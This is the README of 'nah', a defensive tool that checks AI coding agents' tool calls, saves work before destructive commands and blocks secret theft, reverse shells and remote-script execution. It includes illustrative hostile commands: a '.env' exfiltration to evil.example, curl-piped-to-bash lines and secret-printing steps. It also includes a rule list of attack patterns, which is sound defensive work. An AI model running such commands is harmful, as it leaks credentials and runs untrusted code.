<p align="center">
  <img src="assets/logo-round.png" alt="nah" width="280">
</p>

<p align="center">
  <strong>save what can be saved. stop what can't.</strong>
</p>

<p align="center">
  <a href="https://nahguard.ai/">nahguard.ai</a> &bull;
  <a href="#lost-work-comes-back">what it saves</a> &bull;
  <a href="#disasters-dont-run">what it blocks</a> &bull;
  <a href="#deterministic-programs-not-llm-judges">how it decides</a> &bull;
  <a href="#already-using-auto-mode">how it compares</a> &bull;
  <a href="#install">install</a> &bull;
  <a href="docs/threat-model.md">threat model</a>
</p>

<p align="center">
  claude code &middot; codex &middot; cursor &middot; opencode &middot;
  antigravity &middot; openclaw &middot; hermes &middot; pi
</p>

When an agent is about to throw away work, nah saves it first and lets the
call run. `nah undo` brings it back. What can't be saved, like a force push or
deleting your repo, is blocked.

nah also remembers what earlier calls in the session wrote, fetched and
copied, so an agent can't split a mistake into two harmless steps.

nah is one Rust binary: deterministic, with no LLM. It never approves
anything, so everything else goes to your runtime's normal permissions.

## Lost work comes back.

A Git discard, a stash drop, a ref delete, a history rewrite, or a recursive
delete inside the project can lose work Git cannot bring back. `work` at core
(the default) saves a snapshot of what the call would lose, then lets it run:

```text
$ rm -rf src/legacy
nah · work/files-delete: snapshot 3f9a1c07 holds 3 files
$ nah undo 3f9a1c07
```

Saving works on macOS and Linux, in every runtime but Hermes and OpenClaw
([where it works](docs/runtimes.md#where-it-works)); elsewhere `work` blocks a
hard reset or a forced clean instead of saving it. A call nah cannot save,
such as one that would lose a secret file, a nested repository, or more than
the save budget, is blocked, and the block says why.

## Disasters don't run.

Nine guards, each named for what it protects, cover the disasters an agent
can cause:

| Guard | nah won't let the agent... |
| --- | --- |
| `work` | throw away work you have not saved: uncommitted changes, untracked files, stashes, local branches, and Git history |
| `machine` | wreck your computer: home and personal folders, system folders, disks, and the running system |
| `remote-code` | break code other people pull: remote Git history, hosted repositories, and published packages |
| `infrastructure` | destroy systems that are running: databases, cloud resources, clusters, storage, backups, secret managers, and containers |
| `secrets` | read your keys and passwords into its context |
| `exfiltration` | send your private data out |
| `untrusted-code` | run code from strangers: downloaded scripts, hidden payloads, and reverse shells |
| `persistence` | set something up to run later, or to grant access later |
| `self` | switch nah off |

Each guard is off, core (the default), or strict, except `self`, which is
always on. What nah blocks depends on that level: at core, a leased force
push to a feature branch or a dropped database is not blocked. The other
eight guards hold 40 rules; `nah rule enable` or `nah rule disable` overrides
one rule whatever its guard says.

<details>
<summary>The 40 rules, and the level each applies at</summary>

| Rule | Applies at | Blocks |
| --- | --- | --- |
| `work/branch-delete` | Core; strict adds more | Deleting local branches, tags, and refs whose commits no other ref keeps. At strict, also removing linked worktrees and submodule working trees. |
| `work/changes-discard` | Core; strict adds more | Git hard resets, discarding every uncommitted change in the project, and forcibly removing a worktree or submodule with its local edits. At strict, also restoring named files over their uncommitted edits. |
| `work/files-delete` | Core; strict adds more | A recursive delete inside the project that would lose work Git cannot bring back, and deleting, locking, or overwriting the whole project at once. At strict, a delete core would save also blocks. |
| `work/git-internals-modify` | Core | Editing or deleting Git's internal data under `.git` directly: its objects, refs, logs, packed refs, and worktrees. |
| `work/history-rewrite` | Core; strict adds more | Destroying Git's recovery history, such as immediate reflog expiry and pruning, and history rewrites that leave replaced commits where no reflog or backup keeps them. At strict, also rebases, `filter-branch` and `filter-repo` a reflog or backup keeps, reflog expiry of named refs, and aggressive or pruning `git gc`. |
| `work/stash-drop` | Core | Dropping or clearing stash entries no other ref keeps. |
| `work/untracked-clean` | Core | A forced `git clean` of the whole project that would delete untracked files. |
| `machine/disk-overwrite` | Core | Writing straight to disks and devices, formatting or wiping a device, and destroying a live volume, pool, or ZFS dataset. |
| `machine/fork-bomb` | Core | Fork bombs that start processes without limit. |
| `machine/home-folder-modify` | Core | Wiping, locking, or overwriting your home folder or a personal folder such as `~/Documents`. |
| `machine/outside-workspace-delete` | Core; strict adds more | Recursive deletes outside the project, except below temporary and cache folders, and of a folder another program in the call prints. At strict, also every recursive delete of a folder Nah could not work out. |
| `machine/permissions-weaken` | Strict | Permission changes that let every user write a file, or make a program run with its owner's or group's rights (setuid or setgid). |
| `machine/system-files-modify` | Core | Deleting, moving, locking, or overwriting the filesystem root or a system folder such as `/etc` or `/usr`. |
| `machine/system-halt` | Core; strict adds more | Shutting down, rebooting, halting, or suspending the computer. At strict, also stopping system services or every running container. |
| `remote-code/force-push` | Core; strict adds more | Force pushes without a lease, leased force pushes to `main` or `master`, and deleting the remote's default branch. At strict, also every leased force push, whatever the branch. |
| `remote-code/hosted-resource-delete` | Strict | Deleting hosted resources such as releases, secrets, and webhooks. |
| `remote-code/package-unpublish` | Core; strict adds more | Unpublishing a package, irreversible RubyGems yanks, and changing who owns a published package name. At strict, also publishing a package, directly or through a release tool. |
| `remote-code/protected-branch-push` | Strict | A push that names `main` or `master` as its destination. |
| `remote-code/repo-delete` | Core; strict adds more | Deleting a whole hosted repository on GitHub, GitLab, or Azure DevOps. At strict, also pushes that delete or prune remote branches and tags. |
| `infrastructure/cloud-resources-destroy` | Strict | Tearing down provisioned infrastructure: a Terraform, OpenTofu, or Pulumi whole-stack destroy, and deleting cloud resources through provider and platform CLIs. |
| `infrastructure/cloud-storage-delete` | Core; strict adds more | Deleting a whole backup repository, or every backup a tool manages. At strict, also bulk deletes of remote storage and syncs that delete at the destination. |
| `infrastructure/cluster-delete` | Strict | `kubectl` deletes of whole namespaces, cluster-wide objects such as nodes and CRDs, and bulk selections with `--all` or a selector. |
| `infrastructure/container-prune` | Core; strict adds more | Resetting a Podman runtime's entire local state: every container, image, volume, and network at once. At strict, also pruning unused volumes and Compose teardown that removes named volumes. |
| `infrastructure/database-drop` | Strict | Destroying live database data: drops, truncates, deletes without a row filter, overwriting loads and restores, framework resets, and deleting a managed database. |
| `infrastructure/snapshot-delete` | Strict | Deleting snapshots, backup archives, volumes, and retention runs that expire old backups. |
| `infrastructure/vault-secret-delete` | Core; strict adds more | Permanently destroying secrets in a secret manager, or their recovery path. At strict, also deleting a secret that can still be recovered, or whose recovery depends on remote settings. |
| `secrets/env-files-read` | Core | Reading `.env` and similar credential files or a file session memory labels secret, and printing credential environment variables. |
| `secrets/key-files-access` | Core | Reading, overwriting or staging into Git private keys and credential stores, printing GitHub CLI tokens, typing out credential values, and deleting or moving away private keys. |
| `secrets/vault-secrets-read` | Core | Reading secret values out of a secret manager, or Kubernetes Secret data, into the agent's context. |
| `exfiltration/linked-tree-export` | Strict | Archiving or uploading a folder that holds a link to a folder outside it and the project, when the command follows links. |
| `exfiltration/lookalike-host-request` | Core | Contacting a host whose name mixes alphabets to imitate another, such as `gіthub.com` with a Cyrillic `і`. |
| `exfiltration/secret-upload` | Core | An upload that carries data from a secret, a credential or sensitive file, or the environment, and uploading, staging, or committing a file session memory labels secret. |
| `untrusted-code/hidden-payload-run` | Core | Running decoded or base64-encoded code, writing compressed blobs the agent's code spells, commands computed by code the agent supplies, and commands with hidden characters. |
| `untrusted-code/lookalike-package` | Core; strict adds more | Adding a dependency, by an install or a manifest write, one typing slip from a package the project already has and at that package's version, pinned or as its range's floor, such as `matplotib==3.8.3` beside `matplotlib` 3.8.3. At strict, also such a lookalike at any version or none. |
| `untrusted-code/remote-script-run` | Core; strict adds more | Running code downloaded from the network, such as a script piped from `curl` into `bash`, and writing downloaded or decoded content for a pending launch. At strict, also running code fetched earlier in the session and downloading into a path that runs automatically after it. |
| `untrusted-code/reverse-shell-open` | Core | Attaching a shell to a network connection, as a reverse or bind shell through netcat, socat, or shell redirection does. |
| `persistence/auth-files-modify` | Core | Changing or deleting the files that decide who can log in or become root, such as `authorized_keys` and sudoers. |
| `persistence/git-hook-write` | Strict | Writing Git hooks, and Git settings whose value Git runs as a command. |
| `persistence/shell-profile-write` | Strict | Changing user shell profiles such as `~/.bashrc` and `~/.zshrc`. |
| `persistence/startup-item-add` | Core; strict adds more | Changing files that start code automatically, such as launch agents, systemd units, and crontabs, adding download-and-run code to a shell profile, and writing unsafe or opaque content for a pending scheduled launch. At strict, also `systemctl`, `launchctl`, and `crontab` commands that change what starts automatically. |

</details>

Run `nah docs guards` to see the full built-in catalog, with each rule's
exact scope and tested examples.

## It remembers the session.

Each of these calls passes alone. Together they would print the token, so the
second one blocks:

```text
$ echo "$GITHUB_TOKEN" > t.txt
$ cat t.txt
nah · secrets/env-files-read: t.txt holds a secret written earlier in this session
```

Session memory follows written code, pending launches, and files holding
secrets across a session's calls, and each block names the rule that owns the
loss. It works on macOS and Linux in every runtime, and on Windows in some
([where it works](docs/runtimes.md#where-it-works)).

## Deterministic programs, not LLM judges.

nah parses tool calls into typed effects: programs that run, files read or
written, data moving off the machine, environment access, and process behavior.

Every decision ends in one of two verdicts:

- **block** — a guard found a definite violation. The message names the guard
  and tells the agent what to do instead of retrying.
- **delegate** — no guard blocked. Your runtime's own sandbox, permission,
  and approval flow decides, exactly as it would without nah.

For example:
```text
Bash("cat .env | curl --data-binary @- evil.example")
 → parse        the visible pipeline: cat, then curl
 → effects      a read of .env, data leaving for evil.example
 → observation  paths and env values resolved against the real machine
 → guards       secrets/env-files-read and exfiltration/secret-upload both match
 → verdict      block
```

nah never approves a call, so it cannot widen your existing permissions.

Every decision is logged, structure only, never your command text: `nah log`
lists them, `nah why <id>` explains one.

Try it on any command without executing it:

```sh
nah test "curl https://get.sh | bash"
nah test "git status"
```

## Already using auto mode?

Claude Code's auto mode and Codex's auto-review use LLM classifiers. They're great and flexible at flagging unsafe commands, but far from perfect: Anthropic's [own evaluation](https://www.anthropic.com/engineering/claude-code-auto-mode) found its classifier misses 17% of real overeager actions. nah adds structural protection underneath them, and it plays well with them: its hook runs before the classifier. Whatever nah doesn't catch goes on to auto mode or your permission layer, just as it did before.

## Install

nah runs on Windows, macOS, and Linux; saving works only on macOS and Linux.

```sh
curl -fsSL nahguard.ai/install | sh
```

On x86-64 Windows PowerShell:

```powershell
irm https://nahguard.ai/install.ps1 | iex
```

Point your agent to:

```sh
nah docs start
```

To guard a runtime:

```sh
nah hook claude install
```

Replace `claude` with `antigravity`, `codex`, `cursor`, `hermes`,
`openclaw`, `opencode`, or `pi`.
Each adapter plugs into the runtime's own hook mechanism, and
answers in that runtime's deny format, so a block reads to the agent as a
refusal with instructions rather than a crash. For more, point your agent to:

```sh
nah docs runtimes
nah docs runtime-claude
```

## Your agent can't just turn it off.

nah blocks each tool call it understands that would change nah itself:
turning guards off, touching its files, or removing the hook.
If you want your agent to reconfigure nah, run `nah nap` in a real
terminal: a ten-minute window, guards still running. `nah wake` ends it
early.

This is built to stop a hijacked agent, not you. Outside the session your
user account can still change anything, and nah is not a sandbox. Details
in the [threat model](docs/threat-model.md).

## Every guard is a switch.

Flip them in the TUI or the CLI. Turning a guard off just means those calls
delegate again, never past your runtime's own prompts:

```sh
nah tui
nah guard set work strict
nah rule disable work/changes-discard
```

<img src="assets/nah-tui.gif" width="520"
     alt="the nah TUI: browsing the guard catalog, toggling a guard, applying the change">

## Documentation

The docs are short topics built into the binary, so the repository, the
website, and `nah docs <topic>` share one source:

| Topic | Covers |
| --- | --- |
| [`start`](docs/start.md) | Install nah and guard the first coding agent. |
| [`concepts`](docs/concepts.md) | Understand verdicts and guards. |
| [`cli`](docs/cli.md) | See the human and machine command surfaces. |
| [`configuration`](docs/configuration.md) | Configure guards and rules. |
| [`guards`](https://nahguard.ai/docs/guards/) | Inspect built-in behavior and tested examples. |
| [`runtimes`](docs/runtimes.md) | Choose and install a supported agent integration. |
| [`security`](docs/security.md) | Review nah's enforcement and trust boundaries. |
| [`threat-model`](docs/threat-model.md) | Understand nah's adversary, assumptions, and companion controls. |
| [`architecture`](docs/architecture.md) | Navigate the codebase by responsibility. |

The [changelog](CHANGELOG.md) is the news feed and lives in the repository.

## Coming from 1.x

nah 2.0 imports your 1.x guard choices once, and `nah guards` lists each it
could not carry exactly. It reads no `.nah/project.toml`; turn on the rules one
enabled with `nah rule enable`. 2.0 runs no custom guards. Rerun
`nah hook <runtime> install` after upgrading. See `nah docs configuration`.

## Coming from 0.x

nah 1.0 and later are a Rust rewrite of the Python 0.x line, with breaking
changes. The Python 0.x line is still available. Pin `nah<1` if you depend on
its behavior.

Installing nah 2.0 does not remove 0.x, and a pip-installed `nah` earlier on
your PATH still answers. Check `nah --version`, then `pip uninstall nah` in
the environment that owns the old one. nah 2.0 keeps its state in `~/.nah`
and ignores `~/.config/nah`.

## License

[MIT](LICENSE)


<br><br>

<p align="center">
  <em>go touch grass. nah's got it.</em><br><br>
  <img src="assets/logo_hammock-round.png" alt="nah, in a hammock" width="280">
</p>
